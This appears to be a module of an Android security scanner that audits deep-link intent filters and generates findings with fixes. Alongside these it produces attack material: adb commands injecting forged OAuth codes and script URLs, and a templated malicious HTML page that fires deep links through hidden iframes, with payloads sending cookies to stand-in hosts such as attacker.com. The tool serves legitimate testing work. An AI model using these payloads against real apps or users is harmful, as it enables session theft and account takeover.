"""
SKILL: Deep Link Interceptor [ACTIVE]
Parses every intent-filter handling URI schemes.
Extracts hosts, paths, parameters.
Generates ready-to-fire malicious HTML and adb commands.
"""

from typing import List, Dict, Optional
from appraisal.engine.base_module import BaseModule
from appraisal.engine.loader import AnalysisContext
from appraisal.models import Finding, CVSSVector, PoC, SkillType


class DeepLinkModule(BaseModule):
    SKILL_NAME  = "Deep Link Interceptor"
    SKILL_TYPE  = SkillType.ACTIVE
    DESCRIPTION = "Maps all deep link handlers and generates spoofing PoCs for unvalidated URI dispatch"

    def run(self, ctx: AnalysisContext) -> List[Finding]:
        self._findings = []
        deep_links = self._collect_deep_links(ctx)
        for dl in deep_links:
            self._audit_deep_link(ctx, dl)
        self._check_android_app_links(ctx, deep_links)
        return self._findings

    # ── Collect all deep link intent filters ─────────────────────────────────

    def _collect_deep_links(self, ctx: AnalysisContext) -> List[Dict]:
        deep_links = []
        for comp in ctx.components:
            for ifilter in comp.intent_filters:
                for data in ifilter.get("data", []):
                    scheme = data.get("scheme", "")
                    if not scheme:
                        continue
                    deep_links.append({
                        "component":   comp.name if comp.name.startswith(ctx.package_name)
                                       else ctx.package_name + comp.name
                                       if comp.name.startswith(".") else comp.name,
                        "comp_type":   comp.component_type,
                        "exported":    comp.exported,
                        "permission":  comp.permission,
                        "scheme":      scheme,
                        "host":        data.get("host", ""),
                        "port":        data.get("port", ""),
                        "path":        data.get("path", ""),
                        "pathPrefix":  data.get("pathPrefix", ""),
                        "pathPattern": data.get("pathPattern", ""),
                        "mimeType":    data.get("mimeType", ""),
                        "actions":     ifilter.get("actions", []),
                        "filter":      ifilter,
                    })
        return deep_links

    # ── Audit a single deep link ──────────────────────────────────────────────

    def _audit_deep_link(self, ctx: AnalysisContext, dl: Dict):
        scheme = dl["scheme"]
        host   = dl["host"]
        comp   = dl["component"]
        short  = comp.split(".")[-1]

        is_http     = scheme in ("http", "https")
        is_custom   = scheme not in ("http", "https", "mailto", "tel", "market")
        is_exported = dl["exported"] is True
        has_perm    = bool(dl["permission"])

        # ── HTTP/HTTPS App Links (potential interception) ─────────────────────
        if is_http and is_exported:
            self._add(Finding(
                id=f"DEEPLINK-HTTP-{short[:25].replace('.','_')}",
                title=f"HTTP/HTTPS Deep Link Handler Without Validation: {short}",
                category="Deep Link Security",
                description=(
                    f"Component {comp} handles {scheme}://{host} deep links. "
                    "If the app does not implement Digital Asset Links (Android App Links), "
                    "any app can register the same intent filter and intercept these deep links. "
                    "If validated parameters (like auth codes, tokens, or URLs) are passed "
                    "via the deep link, they can be stolen or tampered with."
                ),
                technical_detail=(
                    f"Scheme: {scheme}\nHost: {host or 'Any'}\n"
                    f"Path: {dl['path'] or dl['pathPrefix'] or dl['pathPattern'] or 'Any'}\n"
                    f"Component: {comp}\nExported: {is_exported}\n"
                    f"Permission: {dl['permission'] or 'None'}"
                ),
                cvss=CVSSVector(AV="N", AC="L", PR="N", UI="R", S="U", C="H", I="H", A="N"),
                evidence=[
                    f"<intent-filter> with scheme={scheme}, host={host or 'any'}",
                    f"android:exported=true, no permission guard",
                ],
                affected_components=[comp],
                remediation=(
                    "Implement Android App Links: host a Digital Asset Links JSON file at "
                    f"https://{host or 'yourdomain.com'}/.well-known/assetlinks.json and add "
                    "android:autoVerify=\"true\" to the intent-filter. "
                    "Validate all parameters passed via deep link before use. "
                    "Never directly load deep link URLs into WebViews without sanitization."
                ),
                pocs=[
                    PoC(
                        type="adb_command",
                        title="Trigger Deep Link via ADB",
                        description="Fire the deep link directly from ADB to test handler behavior",
                        code=(
                            f"# Basic deep link trigger\n"
                            f"adb shell am start \\\n"
                            f"  -a android.intent.action.VIEW \\\n"
                            f"  -d \"{scheme}://{host or 'example.com'}/path?param=value\" \\\n"
                            f"  -n {ctx.package_name}/{comp}\n\n"
                            f"# Test with OAuth callback token injection\n"
                            f"adb shell am start \\\n"
                            f"  -a android.intent.action.VIEW \\\n"
                            f"  -d \"{scheme}://{host or 'example.com'}/callback?code=ATTACKER_CODE&state=csrf\" \\\n"
                            f"  -n {ctx.package_name}/{comp}\n\n"
                            f"# Test WebView URL injection via deep link\n"
                            f"adb shell am start \\\n"
                            f"  -a android.intent.action.VIEW \\\n"
                            f"  -d \"{scheme}://{host or 'example.com'}/webview?url=javascript:alert(document.cookie)\" \\\n"
                            f"  -n {ctx.package_name}/{comp}"
                        ),
                    ),
                    PoC(
                        type="html_page",
                        title="Malicious HTML Page — Deep Link Trigger",
                        description=(
                            "Host this page on a server or open locally. "
                            "When the victim visits, it fires the deep link in the background."
                        ),
                        code=self._generate_html_poc(ctx, dl),
                    ),
                ],
                tags=["deep-link", "intent", "app-links", "open-redirect"],
            ))

        # ── Custom scheme (unverified, trivially interceptable) ───────────────
        elif is_custom and is_exported and not has_perm:
            self._add(Finding(
                id=f"DEEPLINK-CUSTOM-{scheme[:15]}-{short[:15].replace('.','_')}",
                title=f"Custom Scheme Deep Link Interception Risk: {scheme}://",
                category="Deep Link Security",
                description=(
                    f"Component {comp} handles the custom URI scheme \"{scheme}://\". "
                    "Custom URI schemes cannot be verified via Digital Asset Links — "
                    "any app on the device can register the same scheme and intercept "
                    "deep links before they reach the legitimate app. "
                    "OAuth redirect URIs using custom schemes are especially dangerous."
                ),
                technical_detail=(
                    f"Custom scheme: {scheme}://\n"
                    f"Host filter: {host or 'Any'}\n"
                    f"Component: {comp}"
                ),
                cvss=CVSSVector(AV="L", AC="L", PR="N", UI="R", S="U", C="H", I="H", A="N"),
                evidence=[f"Custom scheme \"{scheme}\" in <intent-filter> on {comp}"],
                affected_components=[comp],
                remediation=(
                    "Replace custom scheme deep links with Android App Links (https://) "
                    "and implement Digital Asset Links verification. "
                    "For OAuth redirects, use PKCE and validate the state parameter."
                ),
                pocs=[
                    PoC(
                        type="adb_command",
                        title="Intercept Custom Scheme Deep Link",
                        description="Send forged custom scheme URI to the handler",
                        code=(
                            f"# Fire custom scheme deep link\n"
                            f"adb shell am start \\\n"
                            f"  -a android.intent.action.VIEW \\\n"
                            f"  -d \"{scheme}://{host or 'host'}/path?injected=value\"\n\n"
                            f"# OAuth code injection via custom redirect URI\n"
                            f"adb shell am start \\\n"
                            f"  -a android.intent.action.VIEW \\\n"
                            f"  -d \"{scheme}://{host or 'callback'}/oauth?code=STOLEN_CODE&state=bypass\""
                        ),
                    ),
                    PoC(
                        type="html_page",
                        title="Malicious Redirect HTML — Custom Scheme",
                        description="Auto-triggers custom scheme deep link from browser context",
                        code=self._generate_html_poc(ctx, dl),
                    ),
                ],
                tags=["deep-link", "custom-scheme", "oauth", "interception"],
            ))

    # ── Android App Links verification check ─────────────────────────────────

    def _check_android_app_links(self, ctx: AnalysisContext, deep_links: List[Dict]):
        """Check if http/https deep links have autoVerify set."""
        http_links = [dl for dl in deep_links if dl["scheme"] in ("http", "https")]
        if not http_links:
            return

        # Check for autoVerify in manifest
        auto_verify_domains = []
        no_verify_domains   = []

        for comp in ctx.components:
            for ifilter in comp.intent_filters:
                for data in ifilter.get("data", []):
                    if data.get("scheme") in ("http", "https"):
                        host = data.get("host", "unknown")
                        # We check the raw manifest XML for autoVerify
                        autoverify_true = 'autoVerify="true"'
                        autoverify_true2 = "autoVerify='true'"
                        if autoverify_true in ctx.manifest_xml or \
                           autoverify_true2 in ctx.manifest_xml:
                            auto_verify_domains.append(host)
                        else:
                            no_verify_domains.append(host)

        if no_verify_domains:
            unique_no_verify = list(set(no_verify_domains))
            self._add(Finding(
                id="DEEPLINK-NOVERIFY",
                title="HTTP/HTTPS Deep Links Without android:autoVerify",
                category="Deep Link Security",
                description=(
                    "One or more intent-filters handle HTTP/HTTPS deep links but "
                    "do not have android:autoVerify=\"true\". "
                    "Without autoVerify, Android cannot confirm that this app is the "
                    "legitimate owner of the domain. Any other app can register the same "
                    "scheme+host combination and compete to handle these URLs, "
                    "leading to a disambiguation dialog — or silent hijacking if it "
                    "registers with higher priority."
                ),
                technical_detail=(
                    f"Domains without autoVerify: {unique_no_verify}\n"
                    "Android verifies App Links by checking "
                    "https://<domain>/.well-known/assetlinks.json at install time. "
                    "Without autoVerify=true, this check is skipped entirely."
                ),
                cvss=CVSSVector(AV="N", AC="L", PR="N", UI="R", S="U", C="H", I="H", A="N"),
                evidence=[f"HTTP/HTTPS intent-filter missing autoVerify on: {unique_no_verify}"],
                affected_components=unique_no_verify,
                remediation=(
                    "Add android:autoVerify=\"true\" to all intent-filters with http/https schemes. "
                    "Host assetlinks.json at https://<domain>/.well-known/assetlinks.json. "
                    "Verify with: adb shell pm get-app-links --user cur <package>"
                ),
                pocs=[
                    PoC(
                        type="adb_command",
                        title="Check App Link Verification Status",
                        description="Verify whether Android has verified this app's domain ownership",
                        code=(
                            f"# Check verification status\n"
                            f"adb shell pm get-app-links --user cur {ctx.package_name}\n\n"
                            f"# Reset verification (forces re-check)\n"
                            f"adb shell pm set-app-links --package {ctx.package_name} 0 all\n\n"
                            f"# Manually verify (Android 12+)\n"
                            f"adb shell pm verify-app-links --re-verify {ctx.package_name}"
                        ),
                    ),
                ],
                tags=["app-links", "deep-link", "auto-verify", "domain-verification"],
            ))

    # ── HTML PoC Generator ────────────────────────────────────────────────────

    def _generate_html_poc(self, ctx: AnalysisContext, dl: Dict) -> str:
        scheme = dl["scheme"]
        host   = dl["host"] or "target.com"
        path   = dl["path"] or dl["pathPrefix"] or "/callback"
        pkg    = ctx.package_name

        base_url = f"{scheme}://{host}{path}"

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Deep Link PoC — Appraisal: DEX</title>
  <style>
    body {{ font-family: monospace; background: #1a1a2e; color: #e94560; padding: 2rem; }}
    h1 {{ color: #e94560; }}
    .info {{ color: #a8b2d8; margin: 1rem 0; }}
    button {{
      background: #e94560; color: white; border: none;
      padding: 1rem 2rem; font-size: 1rem; cursor: pointer;
      border-radius: 4px; margin: 0.5rem;
    }}
    pre {{ background: #0f3460; padding: 1rem; border-radius: 4px; color: #a8ffd6; overflow-x: auto; }}
    .result {{ margin-top: 1rem; padding: 1rem; background: #0f3460; border-radius: 4px; }}
  </style>
</head>
<body>
  <h1>&#9876; Appraisal: DEX — Deep Link PoC</h1>
  <div class="info">
    <strong>Target Package:</strong> {pkg}<br>
    <strong>Scheme:</strong> {scheme}://<br>
    <strong>Host:</strong> {host}<br>
    <strong>Base URL:</strong> {base_url}
  </div>

  <h2>Attack Vectors</h2>

  <button onclick="fire(encodeURIComponent('javascript:alert(document.cookie)'))">
    &#9889; XSS via WebView loadUrl()
  </button>
  <button onclick="fire('https://evil.attacker.com/steal?data=')">
    &#128279; Open Redirect
  </button>
  <button onclick="fireOAuth()">
    &#128273; OAuth Code Injection
  </button>
  <button onclick="fireCustom()">
    &#9881; Custom Payload
  </button>

  <div class="result" id="result">Awaiting trigger...</div>

  <h2>Generated Payloads</h2>
  <pre id="payloads"></pre>

  <script>
    const BASE = "{base_url}";
    const PKG  = "{pkg}";

    function fire(payload) {{
      const url = BASE + "?url=" + payload + "&injected=true&ts=" + Date.now();
      document.getElementById('result').innerHTML =
        '<strong>Fired:</strong> <code>' + url + '</code>';
      document.getElementById('payloads').textContent = url;

      // Method 1: iframe redirect
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = url;
      document.body.appendChild(iframe);
      setTimeout(() => document.body.removeChild(iframe), 3000);

      // Method 2: direct navigation
      setTimeout(() => {{ window.location.href = url; }}, 500);
    }}

    function fireOAuth() {{
      const url = BASE + "?code=ATTACKER_STOLEN_CODE&state=bypassed&session_state=hijacked";
      document.getElementById('result').innerHTML =
        '<strong>OAuth Injection Fired:</strong> <code>' + url + '</code>';
      window.location.href = url;
    }}

    function fireCustom() {{
      const payload = prompt("Enter custom payload:", "{scheme}://{host}/admin?debug=true");
      if (payload) {{
        document.getElementById('result').innerHTML =
          '<strong>Custom Fired:</strong> <code>' + payload + '</code>';
        window.location.href = payload;
      }}
    }}

    // Auto-generate all payloads on load
    const payloads = [
      BASE + "?url=javascript:alert(document.cookie)",
      BASE + "?url=file:///data/data/{pkg}/shared_prefs/",
      BASE + "?url=https://attacker.com/steal?c="+encodeURIComponent(document.cookie),
      BASE + "?code=INJECTED_OAUTH_CODE&state=csrf_bypass",
      BASE + "?redirect=https://evil.com",
      BASE + "?token=forged_token&user_id=0",
    ];
    document.getElementById('payloads').textContent = payloads.join('\\n');
  </script>
</body>
</html>"""
